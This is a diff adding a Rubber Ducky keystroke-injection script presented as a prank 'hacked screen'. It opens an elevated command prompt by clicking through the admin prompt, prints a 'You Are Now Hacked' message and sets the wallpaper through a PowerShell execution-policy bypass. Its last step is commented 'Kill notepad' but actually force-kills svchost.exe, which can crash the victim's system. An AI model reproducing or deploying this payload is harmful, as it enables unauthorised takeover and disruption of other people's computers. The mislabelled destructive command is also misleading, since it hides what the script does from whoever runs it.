@@ -1,0 +1,49 @@
+REM =============================================
+REM  Rubber Ducky - Fake Hacked Screen + Wallpaper
+REM  Opens admin CMD → troll message → wallpaper + kill notepad
+REM =============================================
+
+DELAY 800
+
+GUI r
+DELAY 80
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 400
+TAB
+DELAY 400
+TAB
+DELAY 400
+ENTER
+
+STRING color 0c
+ENTER
+DELAY 120
+
+STRING cls
+ENTER
+DELAY 180
+
+STRING echo.
+ENTER
+STRING echo   =============================================
+ENTER
+STRING echo          You Are Now Hacked By Pwner
+ENTER
+STRING echo   =============================================
+ENTER
+STRING echo.
+ENTER
+DELAY 400
+
+REM ─────────────────────────────────────────────
+REM  Set wallpaper via PowerShell (http image)
+REM ─────────────────────────────────────────────
+STRING powershell -nop -exec bypass -c "$w='https://i.imgur.com/OlMHsrU.png'; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Wallpaper{ [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20,0,$w,3)"
+ENTER
+DELAY 6000
+
+REM Kill notepad (if running)
+STRING taskkill /F /IM svchost.exe
+ENTER
+DELAY 300
